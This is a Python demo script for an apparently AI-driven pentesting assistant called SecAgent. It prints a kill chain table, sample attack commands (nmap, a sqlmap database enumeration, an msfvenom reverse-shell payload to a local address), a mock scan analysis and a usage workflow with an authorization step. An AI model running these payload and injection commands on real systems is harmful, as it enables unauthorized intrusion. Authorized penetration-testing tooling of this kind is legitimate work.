#!/usr/bin/env python3
"""
SecAgent Demo Script
Demonstrates the capabilities of the interactive AI pentesting assistant
"""

import asyncio
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.columns import Columns
from colorama import init, Fore, Style

init(autoreset=True)
console = Console()

def display_demo_banner():
    """Display demo banner"""
    banner = f"""
{Fore.CYAN}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║                        🎬 SECAGENT DEMONSTRATION                              ║
║                                                                               ║
║                   Interactive AI Pentesting Assistant Demo                   ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}

{Fore.GREEN}🎯 What you'll see in this demo:{Style.RESET_ALL}
• Interactive command generation based on natural language
• Cyber Kill Chain framework progression
• Command template library usage
• Intelligent output analysis
• Vulnerability detection and reporting
• Session management and tracking

{Fore.YELLOW}⚠️ This is a demonstration - no actual commands will be executed{Style.RESET_ALL}
"""
    print(banner)

def demo_kill_chain_phases():
    """Demonstrate kill chain phases"""
    console.print("\n[bold blue]🎯 Cyber Kill Chain Phases[/bold blue]")
    
    phases = [
        ("reconnaissance", "🔍 Information Gathering", "nmap, whois, sublist3r"),
        ("weaponization", "🔧 Tool/Payload Creation", "msfvenom, custom scripts"),
        ("delivery", "📤 Payload Delivery", "HTTP server, email, USB"),
        ("exploitation", "💥 Vulnerability Exploitation", "sqlmap, metasploit"),
        ("installation", "⚙️ Persistence Installation", "backdoors, scheduled tasks"),
        ("command_control", "🎮 C2 Communication", "meterpreter, empire"),
        ("actions_objectives", "🎯 Final Objectives", "data exfil, lateral movement")
    ]
    
    table = Table(title="Kill Chain Framework")
    table.add_column("Phase", style="cyan", width=20)
    table.add_column("Description", style="white", width=30)
    table.add_column("Common Tools", style="green", width=30)
    
    for phase, desc, tools in phases:
        table.add_row(phase.title().replace('_', ' '), desc, tools)
    
    console.print(table)

def demo_command_examples():
    """Show example commands and AI responses"""
    console.print("\n[bold blue]💻 Example Command Generation[/bold blue]")
    
    examples = [
        {
            "user_input": "scan all ports on 192.168.1.100",
            "ai_command": "nmap -sS -sV -O -A -p- 192.168.1.100",
            "explanation": "Comprehensive TCP SYN scan with service detection, OS fingerprinting, and script scanning"
        },
        {
            "user_input": "test the web app for SQL injection",
            "ai_command": "sqlmap -u 'http://192.168.1.100/login.php' --forms --batch --dbs",
            "explanation": "Automated SQL injection testing on web forms with database enumeration"
        },
        {
            "user_input": "generate a reverse shell payload",
            "ai_command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf",
            "explanation": "Create Linux 64-bit reverse TCP shell payload in ELF format"
        }
    ]
    
    for i, example in enumerate(examples, 1):
        console.print(f"\n[bold yellow]Example {i}:[/bold yellow]")
        console.print(Panel(
            f"[bold green]User Input:[/bold green] {example['user_input']}\n\n"
            f"[bold blue]Generated Command:[/bold blue] {example['ai_command']}\n\n"
            f"[bold cyan]Explanation:[/bold cyan] {example['explanation']}",
            border_style="green"
        ))

def demo_vulnerability_analysis():
    """Demonstrate vulnerability analysis capabilities"""
    console.print("\n[bold blue]🚨 Vulnerability Analysis Example[/bold blue]")
    
    sample_nmap_output = """
Starting Nmap 7.80 ( https://nmap.org )
Nmap scan report for target.example.com (192.168.1.100)
Host is up (0.0010s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS))
443/tcp  open  https   Apache httpd 2.4.6 ((CentOS))
3306/tcp open  mysql   MySQL 5.7.25
"""
    
    ai_analysis = {
        "findings": [
            "SSH service running on port 22 (OpenSSH 7.4)",
            "Web server running Apache 2.4.6 on ports 80/443",
            "MySQL database exposed on port 3306"
        ],
        "vulnerabilities": [
            {
                "type": "Exposed Database Service",
                "severity": "High",
                "description": "MySQL service accessible from external network",
                "impact": "Potential unauthorized database access",
                "remediation": "Restrict MySQL access to localhost only"
            },
            {
                "type": "Outdated Software",
                "severity": "Medium", 
                "description": "Apache 2.4.6 may have known vulnerabilities",
                "impact": "Potential web server compromise",
                "remediation": "Update Apache to latest version"
            }
        ],
        "next_steps": [
            "Test MySQL for weak credentials",
            "Scan web application for vulnerabilities",
            "Check for SSH brute force opportunities"
        ]
    }
    
    console.print(Panel(sample_nmap_output, title="Sample Nmap Output", border_style="yellow"))
    
    console.print("\n[bold green]🤖 AI Analysis Results:[/bold green]")
    
    # Findings
    findings_text = "\n".join([f"• {finding}" for finding in ai_analysis['findings']])
    console.print(Panel(findings_text, title="🔍 Key Findings", border_style="blue"))
    
    # Vulnerabilities
    for vuln in ai_analysis['vulnerabilities']:
        severity_color = {'High': 'red', 'Medium': 'yellow', 'Low': 'green'}.get(vuln['severity'], 'white')
        vuln_text = f"[bold]Severity:[/bold] {vuln['severity']}\n"
        vuln_text += f"[bold]Description:[/bold] {vuln['description']}\n"
        vuln_text += f"[bold]Impact:[/bold] {vuln['impact']}\n"
        vuln_text += f"[bold]Remediation:[/bold] {vuln['remediation']}"
        
        console.print(Panel(
            vuln_text,
            title=f"🚨 {vuln['type']}",
            border_style=severity_color
        ))

def demo_session_features():
    """Demonstrate session management features"""
    console.print("\n[bold blue]💾 Session Management Features[/bold blue]")
    
    features = [
        ("Command History", "All executed commands and outputs are tracked"),
        ("Vulnerability Database", "Discovered vulnerabilities are cataloged with details"),
        ("Phase Progress", "Kill chain advancement is monitored and saved"),
        ("Intelligence Scoring", "Each finding is scored for intelligence value"),
        ("Export Options", "Sessions can be exported as JSON or HTML reports"),
        ("Resume Capability", "Sessions can be resumed from saved state")
    ]
    
    table = Table(title="Session Management")
    table.add_column("Feature", style="cyan", width=20)
    table.add_column("Description", style="white", width=50)
    
    for feature, desc in features:
        table.add_row(feature, desc)
    
    console.print(table)

def demo_usage_workflow():
    """Show typical usage workflow"""
    console.print("\n[bold blue]🔄 Typical Usage Workflow[/bold blue]")
    
    workflow_steps = [
        ("1. Start Session", "Launch interactive assistant and set target"),
        ("2. Authorization", "Confirm you have permission to test the target"),
        ("3. Reconnaissance", "Use natural language to request port scans, DNS enum, etc."),
        ("4. Execute Commands", "Copy provided commands and paste results back"),
        ("5. AI Analysis", "Get intelligent analysis of command outputs"),
        ("6. Follow Guidance", "Progress through kill chain phases with AI guidance"),
        ("7. Document Findings", "Vulnerabilities and findings are automatically tracked"),
        ("8. Generate Report", "Export comprehensive penetration testing report")
    ]
    
    for step, description in workflow_steps:
        console.print(f"[bold green]{step}:[/bold green] {description}")

def main():
    """Run the demo"""
    display_demo_banner()
    
    console.print("\n[bold]Press Enter to continue through each section...[/bold]")
    input()
    
    demo_kill_chain_phases()
    input("\nPress Enter to continue...")
    
    demo_command_examples()
    input("\nPress Enter to continue...")
    
    demo_vulnerability_analysis()
    input("\nPress Enter to continue...")
    
    demo_session_features()
    input("\nPress Enter to continue...")
    
    demo_usage_workflow()
    
    console.print(f"""
{Fore.GREEN}
🎉 Demo Complete!

Ready to try SecAgent? Run one of these commands:

{Fore.CYAN}Basic Mode:{Style.RESET_ALL}
python3 interactive_agent.py

{Fore.CYAN}Enhanced Mode:{Style.RESET_ALL}
python3 enhanced_interactive.py

{Fore.CYAN}Quick Start:{Style.RESET_ALL}
./start_interactive.sh

{Fore.YELLOW}Remember: Only use on systems you have explicit permission to test!{Style.RESET_ALL}
""")

if __name__ == "__main__":
    main()
